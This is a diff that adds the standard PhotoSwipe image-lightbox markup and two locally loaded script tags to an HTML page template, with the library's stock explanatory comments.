+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
